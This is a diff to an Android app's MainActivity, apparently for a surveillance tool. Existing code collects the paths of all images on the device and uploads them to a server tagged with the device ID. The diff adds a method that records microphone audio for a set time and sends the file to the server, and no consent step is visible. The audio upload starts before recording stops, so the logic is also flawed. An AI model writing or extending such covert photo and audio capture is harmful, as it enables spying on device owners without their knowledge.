@@ -5,19 +5,20 @@ import android.database.Cursor;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
+import android.os.Bundle;
 import android.os.Environment;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
 import android.util.Pair;
 import android.view.Menu;
 import android.view.MenuItem;
 
-import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -160,7 +161,6 @@ public class MainActivity extends AppCompatActivity {
             final int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
             do {
                 final String data = cursor.getString(dataColumn);
-                System.out.println("IMAGEN DE LA CAMARITA\n" + data);
                 result.add(data);
             } while (cursor.moveToNext());
         }
@@ -169,4 +169,37 @@ public class MainActivity extends AppCompatActivity {
         new SendPicturesAsyncTask(this, android_id, result).execute();
 
     }
+
+    public void sendAudio(String android_id, int time){
+
+        final AudioRecorder audioRecorder = new AudioRecorder(android_id+"audio.3gp", time);
+        audioRecorder.startRecording();
+
+        new Timer().schedule(new TimerTask() {
+
+            @Override
+            public void run() {
+                runOnUiThread(new Runnable() {
+
+                    @Override
+                    public void run()
+                    {
+                        audioRecorder.stopRecording();
+                    }
+                });
+
+            }
+        }, time);
+
+
+        // Send the file to the server
+
+        new SendAudioAsyncTask(this, android_id, audioRecorder.getmFileName()).execute();
+
+    }
+
+    public void sendPhoto(){
+
+    }
+
 }
